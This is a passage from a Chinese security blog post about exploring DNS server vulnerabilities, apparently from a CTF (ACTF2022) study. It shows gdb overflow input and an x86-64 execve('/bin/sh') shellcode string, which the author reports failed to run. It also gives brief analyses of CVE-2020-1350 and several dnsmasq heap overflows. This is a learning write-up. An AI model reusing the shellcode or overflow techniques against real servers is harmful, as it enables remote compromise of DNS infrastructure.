+<pre class="language-gdb" data-language="gdb"><code class="language-gdb">set args aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbccccccccddddddddeeeeeeeeffffffffgggggggg</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240234555.png"></p>
+<p>若将rbx直接设置为shellcode将会直接跳转至shellcode，但是并不能执行，因为在该段内存空间并没有执行权限</p>
+<pre class="language-none"><code class="language-none">set $rbx&#x3D;&quot;jhH\xb8&#x2F;bin&#x2F;&#x2F;&#x2F;sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&quot;</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240234341.png"></p>
+<p>但是并没有执行权限</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240234985.png"></p>
+<p>故，此路暂时不通，虽然暂时不能利用获得shell，但是通过已经了解了改漏洞的成因和调试方法即可（实在太太菜连shell都拿不到）……（待日后我突然开窍了就懂利用了再来补充），并且在阅读exp可知，payload本质上就是垃圾数据+jmp esp+shellcode（嘴硬）</p>
+<h4 id="CVE-2020-1350"><a href="#CVE-2020-1350" class="headerlink" title="CVE-2020-1350"></a>CVE-2020-1350</h4><p> Windows DNS漏洞</p>
+<p>相关链接：</p>
+<pre class="language-URL" data-language="URL"><code class="language-URL">https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name&#x3D;CVE-2020-1350</code></pre>
+
+<p>漏洞描述：DNS.exe在处理畸形的DNS Sig消息时，由于对数据包的字段检验不合格，将导致整型溢出，进而导致堆溢出。</p>
+<p>漏洞抽象模型：</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">Examples</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> in<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">unsigned</span> <span class="token keyword">short</span> len_p1 <span class="token operator">=</span> <span class="token function">len</span><span class="token punctuation">(</span>in<span class="token punctuation">.</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//假设len_p1=0xFFD0</span>
+    <span class="token keyword">unsigned</span> <span class="token keyword">short</span> len_p2 <span class="token operator">=</span> <span class="token function">len</span><span class="token punctuation">(</span>in<span class="token punctuation">.</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//假设len_p2=0x40</span>
+    <span class="token keyword">unsigned</span> <span class="token keyword">short</span> len_p <span class="token operator">=</span>  len_p1 <span class="token operator">+</span> len_p2<span class="token punctuation">;</span>  <span class="token comment">//相加后高位数据被丢弃==》0x10010==》0x10</span>
+    <span class="token keyword">char</span><span class="token operator">*</span> buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>len_p<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//申请0x10</span>
+    <span class="token function">memcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> in<span class="token punctuation">.</span>p1<span class="token punctuation">,</span> len_p1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//导致堆溢出</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>DNS.exe：Windows server 2008</p>
+<p>漏洞发生于SigwireRead函数：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212232232628.png"></p>
+<p>该函数用于处理SIG类型的响应包，RR_AllocateEx用于分配空间，并且分配的大小由CX寄存器传入，CX寄存器只有16 bit，大小为0~65535，使用整型溢出构造size&gt;65535，再由memcpy函数实现堆溢出。</p>
+<h4 id="其他缓冲区溢出漏洞"><a href="#其他缓冲区溢出漏洞" class="headerlink" title="其他缓冲区溢出漏洞"></a>其他缓冲区溢出漏洞</h4><p>受影响版本：DNSmasq &lt; 2.83</p>
+<p><strong>CVE-2020-25681：</strong></p>
+<p>漏洞描述：位于sort_rrset()中的堆溢出漏洞</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240234086.png"></p>
+<p>函数接受响应数据包（header），数据包长度（plen）</p>
+<p>rrset是指向资源记录集合中RR数组的指针</p>
+<p>rrsetidx是集合中的RR数</p>
+<p>rr_desc是指向与RRset关联的RR类型的描述符指针</p>
+<p>buff1与buff2为两个缓冲区，大小都为2050</p>
+<p><strong>CVE-2020-25682：</strong></p>
+<p>漏洞描述：位于extract_name()中的缓冲区溢出漏洞</p>
+<p><strong>CVE-2020-25683：</strong></p>
+<p>漏洞描述：位于rfc1035.c:extract_name()中数据长度未检查导致使代码可以在get_rdata()中出现以负大小执行memcpy()的堆溢出漏洞</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240235863.png"></p>
+<p><strong>CVE-2020-25687：</strong></p>
+<p>漏洞描述：位于rfc1035.c:extract_name()中数据长度未检查导致使代码可以在sort_rrset()中出现以负大小执行memcpy()的堆溢出漏洞</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于DNS相关漏洞的挖掘初探，虽然很多漏洞并不能复现成功，算是不虚此行（嘴硬），但是也是定位了漏洞所在位置；</p>
+<p>并通过复现相关漏洞编号，了解到可以通过新（补丁后），老程序对比定位漏洞位置；对于DNS数据包的构造相关知识；对于DNS程序的初步动态调试。</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/09/13/TinyHttpd%E5%88%86%E6%9E%90/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-12-24 02:29:19
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/IOT%E5%AE%89%E5%85%A8/" title="IOT安全">
+                        #IOT安全
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8/" title="协议安全">
+                        #协议安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2023/02/10/vps%E8%8A%82%E7%82%B9%E6%90%AD%E5%BB%BA/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DNS%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2"><span class="toc-text">DNS漏洞初探</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS%E5%8D%8F%E8%AE%AE"><span class="toc-text">DNS协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2022-Mater-of-DNS"><span class="toc-text">ACTF2022 Mater of DNS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%BA%90%E8%BD%AF%E4%BB%B6"><span class="toc-text">获取源软件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E8%AF%91"><span class="toc-text">编译</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AF%B9%E6%AF%94%E5%88%86%E6%9E%90"><span class="toc-text">二进制对比分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%A1%AE%E5%AE%9A"><span class="toc-text">漏洞确定</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GDB%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="toc-text">GDB动态调试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E8%B0%83%E8%AF%95"><span class="toc-text">流量调试</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#wireshark%E6%B5%81%E9%87%8F%E6%8D%95%E8%8E%B7"><span class="toc-text">wireshark流量捕获</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E6%BA%A2%E5%87%BA"><span class="toc-text">尝试溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86%E5%8F%8A%E7%AE%80%E8%BF%B0"><span class="toc-text">DNS服务漏洞搜集及简述</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2017-9430"><span class="toc-text">CVE-2017-9430</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-1350"><span class="toc-text">CVE-2020-1350</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="toc-text">其他缓冲区溢出漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zh-Closure">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">Copyright © 2023 Closure</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">email | 765003952@qq.com</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+      
+      
+          本站访客数<span id="busuanzi_value_site_uv"></span>人
+        
+      
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="可露希尔大涨价……">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + DNS%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2 + '&url=' + http%3A%2F%2Fexample.com%2F2022%2F12%2F24%2FDNS%25E6%25BC%258F%25E6%25B4%259E%25E5%2588%259D%25E6%258E%25A2%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2022/12/24/DNS%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
